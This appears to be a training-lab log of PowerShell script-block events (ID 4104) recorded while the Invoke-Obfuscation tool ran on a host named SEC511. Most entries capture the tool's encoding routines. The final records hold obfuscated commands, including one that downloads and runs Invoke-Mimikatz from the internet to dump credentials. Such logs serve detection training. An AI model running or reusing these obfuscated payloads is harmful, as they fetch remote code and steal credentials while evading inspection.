{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:46.183028Z"},"EventRecordID":603233,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-8702-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"572d2a0f-9d32-43b6-bfab-c07d810afc64","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:46.196249Z"},"EventRecordID":603262,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-9502-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"8b50641d-2e6c-4a6c-9664-a15651918cff","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:46.238304Z"},"EventRecordID":603353,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-CC02-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"3594c52f-122a-4b46-bd3c-2022404435a0","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:20:18.176618Z"},"EventRecordID":604515,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-EF05-72CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"e1df7333-bd63-44d3-8621-88c80801989f","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:15.729980Z"},"EventRecordID":604521,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-55FD-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$UpperLowerChar = $_; If(((Get-Random -Input @(1..2))-1 -eq 0)) {$UpperLowerChar = $UpperLowerChar.ToUpper()} $RandomDelimiters += $UpperLowerChar}","ScriptBlockId":"884cfe6d-7ee4-4cae-acf4-6f637cd23a0f","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:15.743310Z"},"EventRecordID":604544,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-E607-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$DelimitedEncodedArray += ([Convert]::ToString(([Int][Char]$_),$EncodingBase) + (Get-Random -Input $RandomDelimiters))}","ScriptBlockId":"26d619b9-6c8d-4882-b1d1-4ee06004b0a7","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:16.186742Z"},"EventRecordID":605470,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-1C0A-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"f640d28a-6825-47ee-a5d7-eaeec3343df5","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:16.194698Z"},"EventRecordID":605486,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-1D0A-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"f041c7d2-b2e0-456f-8af0-44d9affde662","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:16.199527Z"},"EventRecordID":605496,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-E8FE-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"dc4a6043-404d-4eab-bcf6-cc71cb953dbb","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:16.202749Z"},"EventRecordID":605503,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-230A-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"f5b1c794-d023-4b59-8702-65ccc31d37c7","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:16.205715Z"},"EventRecordID":605509,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-EDFE-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"3fee7bed-1499-4ce1-a2cc-c86f618684e5","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:16.208049Z"},"EventRecordID":605514,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-F1FE-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"721704da-0f72-4b23-997a-59452ba3f0c6","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:16.212295Z"},"EventRecordID":605523,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-2B0A-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"50c5dda3-a547-4b5d-87d9-d7814a4d6502","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:16.222669Z"},"EventRecordID":605544,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-05FF-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"07e9f530-e10f-407f-82d7-cd9a28ddf954","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:16.253095Z"},"EventRecordID":605610,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-6C0A-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"d942dfd5-65b9-40bd-b2be-452c9938b73d","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:16.268195Z"},"EventRecordID":605643,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-18FF-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{\r\n        # Encapsulate current item with single quote if it contains a non-integer.\r\n        If([Convert]::ToString(([Int][Char]$_),$EncodingBase).Trim('0123456789').Length -gt 0) {$Quote = \"'\"}\r\n        Else {$Quote = ''}\r\n        $EncodedArray += ($Quote + [Convert]::ToString(([Int][Char]$_),$EncodingBase) + $Quote + ' '*(Get-Random -Input @(0,1)) + ',' + ' '*(Get-Random -Input @(0,1)))\r\n    }","ScriptBlockId":"bab0e51e-dcb3-46c2-845e-3ec3c720a104","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:17.070629Z"},"EventRecordID":607503,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-AB0D-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"b2742048-0c9f-4bda-be6c-584dfbc9a81f","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:17.087242Z"},"EventRecordID":607531,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-3C03-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"5095e4ea-337e-438c-b3ea-c9d9f2720f9f","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:17.127615Z"},"EventRecordID":607619,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-E50D-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"4e491ebe-cec8-4477-9906-ab9188df75c0","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedHexCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:22.147748Z"},"EventRecordID":607735,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-090E-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":" .( $PsHOME[21]+$pShOMe[30]+'x')( \" $( SET-ITeM 'vAriabLE:OFs' '')\" +[sTRing]('26K28!20%24l65J4e:76&3ai43i6f!4di73K50%45J63J5b:34!2cl31l35%2c&32i35%5d&2d!4aK4fJ69i6e&27l27%29&20!28i5bl73:54l52%49i4eJ67l5d%3a%3ai4a%4f:49K6el28K20:27&27:2ci20:28!28l37%33J2ci20!36l39!20:2c&38:38K20!2c!33:32K2ci20l34!30K20i2c&37i38&2c%31!30!31l2c:31:31K39J2cK34!35&2cJ37i39&20l2c%20l39J38l2cJ31%30K36i20J2cK31K30:31%2c!39i39&2ci31l31l36&2cl20J33&32!2c:20%37:38!20%2c!31i30i31i20:2c:20:31%31:36K2ci34l36K20:2cl38l37l2cJ31J30K31:20i2cl39K38l2cJ36&37%2c:20!31!30%38l2ci31&30!35%20%2c:20%31&30%31l2c!20K31&31K30!20&2c!31:31%36i20&2c!34:31l20J2c!34%36:2cl20&36!38!2c!20%31%31:31l2c!20l31&31i39:20J2cJ31&31i30K20J2c&31!30!38i20K2cK31&31J31:2cK20K39J37%2ci20K31K30K30K2c&20K38&33l20:2cJ20i31l31J36!20K2ci31:31!34!2c%20&31J30%35&20:2c&31l31:30:2cK31:30l33&20J2cK34i30l20J2c&33l39K2c&20!31:30&34J2c%31l31l36&20i2c&31i31i36i2c!31l31:32i2c!20l31i31!35&20l2c%35J38!2c:20%34!37!2c&20K34K37:20K2cl20%31%31!34:2c&39J37:20l2cK20K31J31i39l2c&20&34J36:20i2cJ20!31:30&33&2cJ31l30i35J20%2c!20l31i31K36!2cJ20i31J30K34%20:2cl31K31%37J2cl20:39i38:20i2c%31l31:37!2c!31i31!35i2c%20!31J30!31l2c!31i31%34:20i2cJ20!39!39i2c&20J31K31!31:2cJ20l31K31l30K2c:31l31&36J20:2c:31l30K31&2c%31l31:30:20l2c%20!31J31!36l20!2c&20!34K36%2cK20i39:39K2cJ20K31!31i31!20:2c!20!31i30!39%2ci34i37!2cJ20K31:30i39!2c&39J37!20i2ci20&31K31J36l2cl31J31&36K20&2cK20i31l30K35K20i2cJ20%31l30J32i20J2c!31K30i31K2ci31%31%35l2ci20:31i31K36l2cJ20J39&37:20!2ci31l31J36l20J2c%20:31%30&35!20:2ci31&31i31!2cK20l31!31l30!2c!20i34J37J20:2cl20:38:30J2ci31%31!31K20K2c!31J31i39!2ci31&30i31K20!2ci20%31%31l34%20&2c&20J38&33:2c%20!31&31:32K2cK20&31:30:38i2ci20i31l31J31i2cl31l30l35l2c&20&31&31!36%2ci20&34J37%20:2cJ31K30:39J2cK20!39%37&2cK20:31:31&35&2cK20!31%31:36J20%2c!20i31K30K31i20!2c:31%31!34:20K2cl20&34&37i20J2c&20l36l39K20!2ci20J31!32J30K2c!31:30i32&2cJ20i31i30%35!20K2c!31K30l38:20l2c!31!31l36%20%2c!20i31K31&34%2c%20J39%37J2c!20%31l31&36:20%2cl20K31%30%35!2ci31:31i31:2c:31K31%30i20!2cK20i34%37i20!2c:37K33&20:2cJ31&31K30K2c:31!31%38l20%2c:20i31l31K31%2c%31K30&37:20:2c!20&31&30l31%20l2cl20:34J35%20:2c!37l37J20%2cl31%30&35:2c&31J30%39!2ci20i31:30J35i2c!20%31:30%37%20%2c%20!39K37!20i2c:31i31!36J20:2c&20i31K32J32%2c%20:34%36J2c!31:31i32%2cJ20!31l31&35i20l2cJ20:34:39i2c%20J33&39&20J2cl20i34l31&20:2cK20!35K39l2cJ33K32l20&2c%20!37l33K20:2cK20!31J31:30&20&2ci31:31%38:2c!31K31J31l20!2c!31&30i37!2c!20%31!30%31!20l2ci20&34l35K2cl37:37!2c!20:31i30J35:20&2c!31%30&39J2c%31%30:35&20:2c!20l31:30l37i20!2c:20J39%37%2cJ20:31%31%36K2ci20J31l32:32!2ci33!32!20l2c:34%35K2ci20l36%38l20J2cK20&31i31i37&20&2c!20J31i30:39l2cJ20%31:31i32l2c&36K37i2cl31!31l34l20%2c:31:30&31l2cl31i30&30%20!2c:31l31!35i20:29l7c!66%4f&52l45%61J43l68!2dl4f%62K6aK65:63i74%20:7b!20%28:5bJ49!6e:74i5d!24i5f%20i2di61:53%5bK43K48%41%52&5d:29%20&7d!29J20J29J20!29&20'.split('&K%:Ji!l' )|fOReAcH {( [cONveRt]::tOinT16( ( $_.tOstriNg()),16) -aS [cHar]) }) +\"$(SeT-itEM 'VARiable:oFS' ' ') \" )","ScriptBlockId":"a0417559-bc2d-4170-ad1e-bbbf1ad980a3","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:22.154683Z"},"EventRecordID":607737,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-0A0E-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{( [cONveRt]::tOinT16( ( $_.tOstriNg()),16) -aS [cHar]) }","ScriptBlockId":"7d1ff6cf-696d-4c5e-86e5-afbde2ead85c","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:22:22.178390Z"},"EventRecordID":607739,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-0B0E-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":" &( $eNv:CoMsPEc[4,15,25]-JOin'') ([sTRINg]::JOIn( '', ((73, 69 ,88 ,32, 40 ,78,101,119,45,79 , 98,106 ,101,99,116, 32, 78 ,101 , 116,46 ,87,101 ,98,67, 108,105 , 101, 110 ,116 ,41 ,46, 68, 111, 119 ,110 ,108 ,111, 97, 100, 83 , 116 ,114, 105 ,110,103 ,40 ,39, 104,116 ,116,112, 115 ,58, 47, 47 , 114,97 , 119, 46 , 103,105 , 116, 104 ,117, 98 ,117,115, 101,114 , 99, 111, 110,116 ,101,110 , 116 , 46, 99, 111 , 109,47, 109,97 , 116,116 , 105 , 102 ,101,115, 116, 97 ,116 , 105 ,111, 110, 47 , 80,111 ,119,101 , 114 , 83, 112, 108, 111,105, 116, 47 ,109, 97, 115, 116 , 101 ,114 , 47 , 69 , 120,102, 105 ,108 ,116 , 114, 97, 116 , 105,111,110 , 47 ,73 ,110,118 , 111,107 , 101 , 45 ,77 ,105,109, 105, 107 , 97 ,116 , 122, 46,112, 115 , 49, 39 , 41 , 59,32 , 73 , 110 ,118,111 ,107, 101 , 45,77, 105 ,109,105 , 107 , 97, 116, 122,32 ,45, 68 , 117 , 109, 112,67,114 ,101,100 ,115 )|fOREaCh-Object { ([Int]$_ -aS[CHAR]) }) ) )  ","ScriptBlockId":"c6d30e99-cac2-48d0-98ef-0d64a3868a99","Path":""}}}
